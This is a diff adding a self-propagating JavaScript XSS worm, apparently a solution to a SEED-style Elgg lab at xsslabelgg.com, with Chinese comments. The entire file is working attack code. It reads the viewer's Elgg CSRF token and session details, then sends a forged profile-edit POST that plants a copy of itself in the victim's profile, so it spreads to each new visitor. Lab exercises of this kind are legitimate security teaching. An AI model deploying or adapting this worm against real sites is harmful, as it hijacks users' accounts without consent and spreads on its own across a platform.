@@ -1,0 +1,31 @@
+<script id="worm" type="text/javascript">
+    window.onload = function () {
+        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        // 获取该标签下的内容
+        var jsCode = document.getElementById("worm").innerHTML;
+        var tailTag = "<\/script>";
+        // 将整个script标签的代码进行封装
+        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+        // 表单的基本信息
+        var token = "__elgg_token=" + elgg.security.token.__elgg_token;    // Elgg令牌
+        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;    // Elgg时间戳
+        var userName = "&name=" + elgg.session.user.name;    // 用户名
+        // 个人介绍, 发送时附带整个script标签的代码
+        var description = "&description=Samy is my hero. XSS Worm By wxf" + wormCode;
+        var accesslevel = "&accesslevel[description]=2";
+        var guid = "&guid=" + elgg.session.user.guid;    // 用户guid
+
+        var content = token + ts + userName + description + accesslevel + guid;
+        var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+
+        var samyGuid = 47;
+        if (elgg.session.user.guid != samyGuid) {
+            var Ajax = new XMLHttpRequest();
+            Ajax.open("POST", sendurl, true);
+            Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            Ajax.send(content);
+        }
+    }
+</script>
